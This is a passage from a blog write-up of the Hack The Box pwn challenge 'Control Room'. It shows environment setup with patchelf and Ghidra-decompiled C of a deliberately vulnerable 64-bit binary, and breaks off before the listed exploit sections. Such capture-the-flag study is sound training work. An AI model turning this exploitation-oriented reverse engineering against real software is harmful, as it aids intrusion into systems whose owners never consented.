<!doctype html><html lang="en"><head><title>Control Room | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="64-bit binary. OOB. GOT overwrite"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="64-bit binary. OOB. GOT overwrite"><meta itemprop="keywords" content><meta itemprop="name" content="Control Room"><meta property="article:published_time" content><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="64-bit binary. OOB. GOT overwrite"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="Control Room"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/en/ctf/htb-challenges/pwn/control-room/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="64-bit binary. OOB. GOT overwrite"><meta name="twitter:description" content="64-bit binary. OOB. GOT overwrite"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="Control Room"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/ctf/htb-challenges/pwn/control-room/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/ctf/htb-challenges/pwn/control-room/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- PWN</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/htb-challenges/pwn/control-room/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/control-room/&amp;text=Control%20Room" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/control-room/&amp;title=Control%20Room" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Control Room</h1><p class="mb4 f6 dib tracked">17 minutes to read</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#setup-environment">Setup environment</a></li><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#switching-roles">Switching roles</a></li><li><a href="#captain-options">Captain options</a></li><li><a href="#technician-options">Technician options</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#leaking-memory-addresses">Leaking memory addresses</a></li><li><a href="#getting-rce">Getting RCE</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given a 64-bit binary called <code>control_room</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little
RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
Stack:    <span class="code-dark-green">Canary found</span>
NX:       <span class="code-dark-green">NX enabled</span>
PIE:      <span class="code-dark-red">No PIE (0x400000)</span>  
RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
</code></pre></div><h2 id="setup-environment">Setup environment</h2><p>We are also provided with the remote Glibc library:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./libc.so.6</span>
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.  
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 11.2.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.

<span class="code-cyan">$</span> <span class="code-dark-green">md5sum</span> <span class="mtku">libc.so.6</span>
3d7240354d70ebbd11911187f1acd6e8  libc.so.6
</code></pre></div><p>First of all, it is useful to patch the binary so that it uses the provided Glibc. That way, when developing the exploit, it will presumably work on remote without any issue. Glibc 2.35 appears in Ubuntu 22.04. The best way to get the loader is to use Docker:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">docker</span> run -v <span class="code-dark-yellow">"<span class="code-dark-magenta">$(<span class="code-dark-green">pwd</span>)</span>:/opt"</span> --rm -it ubuntu:22.04 bash
root@78c61fd23ca8:/# md5sum /lib/x86_64-linux-gnu/libc.so.6
3d7240354d70ebbd11911187f1acd6e8  /lib/x86_64-linux-gnu/libc.so.6
root@78c61fd23ca8:/# cp /lib64/ld-linux-x86-64.so.2 /opt
root@78c61fd23ca8:/# exit
exit

<span class="code-cyan">$</span> <span class="code-dark-green">patchelf</span> --set-interpreter <span class="mtku">ld-linux-x86-64.so.2</span> <span class="mtku">control_room</span>

<span class="code-cyan">$</span> <span class="code-dark-green">patchelf</span> --set-rpath <span class="mtku">.</span> <span class="mtku">control_room</span>

<span class="code-cyan">$</span> <span class="code-dark-green">ldd</span> <span class="mtku">control_room</span>
        linux-vdso.so.1 (0x00007ffe4271e000)
        libc.so.6 =&gt; ./libc.so.6 (0x00007f8c612d1000)
        ld-linux-x86-64.so.2 =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f8c614fb000)  
</code></pre></div><p>Now we can have the same environment as in remote.</p><h2 id="reverse-engineering">Reverse engineering</h2><p>We can use Ghidra to analyze the binary and look at the decompiled source code in C:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> ret;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> newline_index;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> in_FS_OFFSET;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> confirmation[</span><span class="mtk6">4</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> canary;</span>

<span class="mtk1">  canary </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk8">setup</span><span class="mtk1">();</span>

<span class="mtk1">  confirmation </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">char</span><span class="mtk1">  [</span><span class="mtk6">4</span><span class="mtk1">]) </span><span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  </span><span class="mtk8">user_register</span><span class="mtk1">();</span>

<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Are you sure about your username choice? (y/n)"</span><span class="mtk1">);</span>  
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">&gt; "</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">fgets</span><span class="mtk1">(confirmation, </span><span class="mtk6">4</span><span class="mtk1">, stdin);</span>

<span class="mtk1">  newline_index </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strcspn</span><span class="mtk1">(confirmation, </span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
<span class="mtk1">  confirmation[newline_index] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">;</span>
<span class="mtk1">  ret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strcmp</span><span class="mtk1">(confirmation, </span><span class="mtk4">"y"</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (ret </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">log_message</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">,</span><span class="mtk4">"User registered successfully.</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk8">user_edit</span><span class="mtk1">();</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk8">menu</span><span class="mtk1">();</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (canary </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">)) {</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">    </span><span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>The first relevant function is <code>user_register</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">user_register</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> length;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> in_FS_OFFSET;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> username[</span><span class="mtk6">256</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> canary;</span>
<span class="mtk1">  </span>
<span class="mtk1">  canary </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"&lt;===[ Register ]===&gt;</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>

<span class="mtk1">  username._0_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._8_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._16_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._24_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._32_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._40_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._48_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._56_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._64_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._72_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._80_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._88_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._96_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._104_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._112_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._120_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._128_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._136_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._144_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._152_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._160_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._168_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._176_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._184_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._192_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._200_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._208_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._216_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._224_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._232_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._240_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  username._248_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>

<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Enter a username: "</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">read_input</span><span class="mtk1">(username, </span><span class="mtk5">0x</span><span class="mtk6">100</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">strncpy</span><span class="mtk1">(curr_user,username, </span><span class="mtk5">0x</span><span class="mtk6">100</span><span class="mtk1">);</span>
<span class="mtk1">  length </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strlen</span><span class="mtk1">(curr_user);</span>
<span class="mtk1">  </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">size_t</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (curr_user </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">108</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> length </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (canary </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">)) {</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>  
<span class="mtk1">    </span><span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
</code></pre></div><p>The program defines three roles with different abilities (we will see those later):</p><ul><li>Captain (<code>0</code>)</li><li>Technician (<code>1</code>)</li><li>Crew (<code>2</code>)</li></ul><p>By default, we start as Crew:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./control_room</span>
&lt;===[ Register ]===&gt;

Enter a username: asdf

Are you sure about your username choice? (y/n)  
&gt; y
[<span class="code-dark-green">+</span>] User registered successfully.


<span class="code-dark-red">┌───────────────┬────────┐</span>
<span class="code-dark-red">│ Control Panel │ 9A0:F3 │</span>
<span class="code-dark-red">├───────────────┴────────┤</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ Technician:            │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 1. Configure Engine    │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 2. Check Engine        │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ Captain:               │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 3. Set route           │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 4. View route          │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 5. Change roles        │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">└────────────────────────┘</span>

[<span class="code-dark-blue">*</span>] Current Role: Crew

<span class="code-white">Option [1-5]:</span>
</code></pre></div><p>We don&rsquo;t have nothing to do as Crew in the above menu. Hence, we must be able to switch roles to Technician or Captain.</p><h3 id="switching-roles">Switching roles</h3><p>This number <code>2</code> for Crew is entered in <code>setup</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">setup</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk8">setvbuf</span><span class="mtk1">(stdin, </span><span class="mtk6">NULL</span><span class="mtk1">, </span><span class="mtk6">2</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">setvbuf</span><span class="mtk1">(stdout, </span><span class="mtk6">NULL</span><span class="mtk1">, </span><span class="mtk6">2</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">read_banner</span><span class="mtk1">();</span>
